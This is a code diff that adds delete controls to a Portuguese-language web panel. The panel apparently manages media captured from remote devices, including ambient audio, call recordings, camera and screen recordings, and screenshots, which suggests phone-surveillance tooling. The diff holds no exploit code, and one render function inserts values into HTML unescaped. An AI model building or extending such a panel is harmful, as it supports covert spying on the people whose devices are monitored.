@@ -1828,6 +1828,59 @@ function handleTelemetry(data) {
 
 }
 
+// ─── Media Delete Helpers ──────────────────────────────────────────────────────
+
+// Delete a single media file and refresh the media list
+async function deleteMediaFile(deviceId, type, fileName) {
+    if (!confirm(`Apagar este arquivo?\n${fileName}`)) return;
+    try {
+        const res = await fetch(`/uploads/${deviceId}/media/${type}/${encodeURIComponent(fileName)}`, {
+            method: 'DELETE',
+            headers: authHeaders()
+        });
+        if (res.ok) {
+            fetchMediaList(deviceId);
+        } else {
+            const body = await res.json().catch(() => ({}));
+            alert('Erro ao apagar: ' + (body.error || res.status));
+        }
+    } catch (e) {
+        alert('Erro de rede ao apagar arquivo.');
+    }
+}
+
+// Clear all media of a given type for the current device
+async function clearMediaType(type) {
+    if (!currentDeviceId) return alert('Selecione um dispositivo primeiro.');
+    const labels = {
+        photos: 'todas as fotos',
+        audio: 'todas as gravações de áudio',
+        screenshots: 'todos os prints de tela',
+        'screen-recordings': 'todas as gravações de tela',
+        'camera-recordings': 'todas as gravações de câmera',
+        'call-recordings': 'todas as gravações de chamadas',
+        all: 'TODA A MÍDIA do dispositivo'
+    };
+    const label = labels[type] || type;
+    if (!confirm(`Deseja realmente apagar ${label}?\n\nEssa ação não pode ser desfeita.`)) return;
+    try {
+        const res = await fetch(`/uploads/${currentDeviceId}/media/${type}`, {
+            method: 'DELETE',
+            headers: authHeaders()
+        });
+        if (res.ok) {
+            const data = await res.json().catch(() => ({}));
+            fetchMediaList(currentDeviceId);
+            logToConsole(`🗑️ ${data.deleted || 0} arquivo(s) apagados (${type}).`, 'system');
+        } else {
+            const body = await res.json().catch(() => ({}));
+            alert('Erro ao limpar: ' + (body.error || res.status));
+        }
+    } catch (e) {
+        alert('Erro de rede ao limpar mídia.');
+    }
+}
+
 // Fetch photos and audios for the selected device
 function fetchMediaList(deviceId) {
     fetch(`/uploads/${deviceId}/media-list`, { headers: authHeaders() })
@@ -1906,14 +1959,18 @@ function renderPhotos(deviceId, photos) {
     }
 
     pmPhotos.forEach((p, idx) => {
+        const fileName = (photos[idx].name || photos[idx]);
         const photoDiv = document.createElement('div');
         photoDiv.className = 'gallery-photo-item';
-        photoDiv.onclick = () => openPhotoModal(idx);
+        photoDiv.style.position = 'relative';
 
         photoDiv.innerHTML = `
             <img src="${escapeHtml(p.url)}" alt="Foto" loading="lazy">
             <span class="photo-timestamp">${escapeHtml(p.caption)}</span>
+            <button class="media-delete-btn media-delete-overlay" title="Apagar foto"><i class="fa-solid fa-trash-can"></i></button>
         `;
+        photoDiv.querySelector('img').addEventListener('click', () => openPhotoModal(idx));
+        photoDiv.querySelector('.media-delete-btn').addEventListener('click', (e) => { e.stopPropagation(); deleteMediaFile(deviceId, 'photos', fileName); });
         gallery.appendChild(photoDiv);
     });
 }
@@ -1952,6 +2009,7 @@ function renderAudios(deviceId, audios) {
                     <span class="audio-name">Áudio Ambiente</span>
                     <span class="audio-time">${timeStr}</span>
                 </div>
+                <button class="media-delete-btn" title="Apagar gravação"><i class="fa-solid fa-trash-can"></i></button>
             </div>
             <div class="audio-player-control">
                 <audio controls preload="metadata">
@@ -1961,6 +2019,7 @@ function renderAudios(deviceId, audios) {
                 </audio>
             </div>
         `;
+        audioDiv.querySelector('.media-delete-btn').addEventListener('click', () => deleteMediaFile(deviceId, 'audio', fileName));
 
         const audioEl = audioDiv.querySelector('audio');
         audioEl.addEventListener('error', async () => {
@@ -2158,11 +2217,15 @@ function renderScreenshots(deviceId, screenshots) {
         return { url, caption: `Print — ${ts}` };
     });
     ssPhotos.forEach((p, idx) => {
+        const fileName = (screenshots[idx].name || screenshots[idx]);
         const div = document.createElement('div');
         div.className = 'photo-item';
+        div.style.position = 'relative';
         div.innerHTML = `<img src="${p.url}" alt="Print ${idx + 1}" loading="lazy">
-            <div class="photo-caption">${p.caption}</div>`;
-        div.onclick = () => { pmPhotos = ssPhotos; pmIndex = idx; openPhotoModal(idx); };
+            <div class="photo-caption">${p.caption}</div>
+            <button class="media-delete-btn media-delete-overlay" title="Apagar print"><i class="fa-solid fa-trash-can"></i></button>`;
+        div.querySelector('img').addEventListener('click', () => { pmPhotos = ssPhotos; pmIndex = idx; openPhotoModal(idx); });
+        div.querySelector('.media-delete-btn').addEventListener('click', (e) => { e.stopPropagation(); deleteMediaFile(deviceId, 'screenshots', fileName); });
         gallery.appendChild(div);
     });
 }
@@ -2190,10 +2253,12 @@ function renderScreenRecordings(deviceId, recordings) {
                     <span class="audio-name">Gravação de Tela</span>
                     <span class="audio-time">${ts}</span>
                 </div>
+                <button class="media-delete-btn" title="Apagar gravação"><i class="fa-solid fa-trash-can"></i></button>
             </div>
             <video controls style="width:100%;max-height:200px;border-radius:8px;margin-top:8px;background:#000" preload="metadata">
                 <source src="${url}" type="video/mp4">
             </video>`;
+        div.querySelector('.media-delete-btn').addEventListener('click', () => deleteMediaFile(deviceId, 'screen-recordings', fileName));
         list.appendChild(div);
     });
 }
@@ -2223,10 +2288,12 @@ function renderCameraRecordings(deviceId, recordings) {
                     <span class="audio-name">Câmera ${faceLabel}</span>
                     <span class="audio-time">${ts}</span>
                 </div>
+                <button class="media-delete-btn" title="Apagar gravação"><i class="fa-solid fa-trash-can"></i></button>
             </div>
             <video controls style="width:100%;max-height:200px;border-radius:8px;margin-top:8px;background:#000" preload="metadata">
                 <source src="${url}" type="video/mp4">
             </video>`;
+        div.querySelector('.media-delete-btn').addEventListener('click', () => deleteMediaFile(deviceId, 'camera-recordings', fileName));
         list.appendChild(div);
     });
 }
@@ -2261,15 +2328,17 @@ function renderCallRecordings(deviceId, recordings) {
         div.className = 'audio-item';
         div.innerHTML = `
             <div class="audio-info" style="flex-direction:column;align-items:flex-start;gap:4px;">
-                <div style="display:flex;align-items:center;gap:8px;">
+                <div style="display:flex;align-items:center;gap:8px;width:100%;">
                     <i class="fa-solid fa-phone" style="color:var(--neon-green)"></i>
                     <span class="audio-name">${dir} &nbsp; ${escapeHtml(number)}</span>
+                    <button class="media-delete-btn" style="margin-left:auto;" title="Apagar gravação"><i class="fa-solid fa-trash-can"></i></button>
                 </div>
                 <span class="audio-time">${ts}</span>
             </div>
             <audio controls style="width:100%;margin-top:8px;" preload="none">
                 <source src="${url}" type="audio/mp4">
             </audio>`;
+        div.querySelector('.media-delete-btn').addEventListener('click', () => deleteMediaFile(deviceId, 'call-recordings', fileName));
         list.appendChild(div);
     });
 }
